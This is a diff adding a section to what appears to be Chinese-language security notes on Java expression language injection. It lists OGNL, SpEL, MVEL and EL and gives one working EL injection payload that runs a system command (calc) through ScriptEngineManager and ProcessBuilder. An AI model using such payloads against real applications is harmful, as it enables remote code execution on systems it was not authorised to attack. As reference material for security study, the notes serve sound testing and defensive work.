@@ -1,4 +1,13 @@
 OGNL(struts2)、SpEL(spring)、MVEL、EL、Fel、JSTL+EL等
+## **EL表达式**
+原生EL（Expression Language）表达式 是为了使JSP写起来更加简单。
+```
+//执行命令
+${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()")}
+```
+
+
+^
 ## **Spring的SpEL表达式注入**
 <https://xie.infoq.cn/article/66d003327e05ab4528fca5a41>
 ```
